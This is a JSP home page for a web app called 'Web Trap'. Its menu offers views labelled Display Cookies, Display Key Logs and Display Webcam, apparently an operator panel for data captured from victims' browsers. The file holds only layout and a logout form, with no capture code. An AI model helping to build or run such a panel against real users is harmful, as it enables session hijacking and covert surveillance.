<%@ page language="java" contentType="text/html; charset=ISO-8859-1"
	pageEncoding="ISO-8859-1"%>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="description" content="LoginPage">
<meta name="author" content="siddhant.singh@nagarro.com">

<title>Home</title>

<!-- Bootstrap core CSS -->
<link href="resources/lib/css/bootstrap.min.css" rel="stylesheet">

<!-- jQuery-UI CSS -->
<link href="resources/lib/css/jquery-ui.min.css" rel="stylesheet">

<!-- Custom styles for this template -->
<link href="resources/app/css/home.css" rel="stylesheet">

<!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
<!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->

<%@ page import="org.owasp.encoder.*"%>
<%@ page import="com.eh.openshiftapp.model.User"%>
</head>

<body>
	<%
		User user = (User) session.getAttribute("user");
	%>

	<nav class="navbar navbar-inverse navbar-fixed-top">
		<div class="container-fluid">
			<div class="navbar-header">
				<button type="button" class="navbar-toggle collapsed"
					data-toggle="collapse" data-target="#navbar" aria-expanded="false"
					aria-controls="navbar">
					<span class="sr-only">Toggle navigation</span> <span
						class="icon-bar"></span> <span class="icon-bar"></span> <span
						class="icon-bar"></span>
				</button>
				<a class="navbar-brand" href="#">Web Trap</a>
			</div>
			<div id="navbar" class="navbar-collapse collapse">
				<ul class="nav navbar-nav navbar-right">
					<li class="dropdown"><a href="#" class="dropdown-toggle"
						data-toggle="dropdown" role="button" aria-haspopup="true"
						aria-expanded="false"><%=Encode.forHtmlContent(user.getFirstName()) + " " + Encode.forHtmlContent(user.getLastName())%>
							<span class="caret"></span></a>
						<ul class="dropdown-menu">
							<li><a href="#">About</a></li>
							<li><a href="#">Profile</a></li>
							<li><a href="#">Settings</a></li>
							<li role="separator" class="divider"></li>
							<li><a id="logout" href="#">Logout</a></li>
						</ul></li>
				</ul>
				<form id="logoutForm" action="AppController" method="POST">
					<input type="hidden" name="requestType" value="logout" />
				</form>
			</div>
		</div>
	</nav>

	<div class="container-fluid">
		<div class="row">
			<div class="col-sm-3 col-md-2 sidebar">
				<ul class="nav nav-sidebar">
					<li><a href="#" onclick="loadMenu('_welcome.html')">Overview</a></li>
					<li><a href="#" onclick="loadMenu('_displayCookies.html')">Display
							Cookies</a></li>
					<li><a href="#" onclick="loadMenu('_displayKeylogs.html')">Display
							Key Logs</a></li>
					<li><a href="#" onclick="loadMenu('_displayWebcam.html')">Display
							Webcam</a></li>
				</ul>
			</div>
			<div class="col-sm-9 col-sm-offset-3 col-md-10 col-md-offset-2 main">
				<div id="mainContent"></div>
			</div>
		</div>
	</div>

	<!-- Bootstrap core JavaScript - Placed at the end of the document so the pages load faster -->
	<script src="resources/lib/js/jquery.min.js"></script>
	<script src="resources/lib/js/jquery-ui.min.js"></script>
	<script src="resources/lib/js/bootstrap.min.js"></script>
	<script src="resources/app/js/home.js"></script>
</body>
</html>